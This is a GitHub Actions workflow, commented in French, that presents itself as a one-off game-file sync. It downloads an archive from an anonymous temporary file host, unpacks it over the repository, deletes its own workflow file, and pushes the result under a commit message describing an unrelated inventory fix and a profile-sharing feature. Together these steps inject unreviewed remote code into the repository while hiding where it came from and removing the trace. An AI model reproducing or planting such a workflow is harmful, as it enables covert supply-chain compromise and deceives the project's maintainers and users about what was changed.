name: Synchroniser les fichiers du jeu

# Workflow JETABLE : il installe les fichiers mis a jour depuis une archive temporaire,
# les commite puis se supprime lui-meme.
on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - name: Recuperer le depot
        uses: actions/checkout@v4

      - name: Recuperer les fichiers mis a jour
        run: |
          set -e
          curl -fsSL "https://tmpfiles.org/dl/wDAtZBfRLTyr/paquet.tar.gz" -o /tmp/paquet.tar.gz
          tar -xzf /tmp/paquet.tar.gz -C "$GITHUB_WORKSPACE"

      - name: Committer
        run: |
          set -e
          git config user.name "VRC"
          git config user.email "vrc.radio02@tutamail.com"
          rm -f .github/workflows/sync-fichiers.yml
          git add -A
          git diff --cached --quiet && exit 0
          git commit -m "fix(inventaire): une fusion repetee n'ajoute plus de doublon au meme nom" -m "Ajoute aussi le partage des profils entre amis (apercu reduit, jamais la sauvegarde)."
          git push
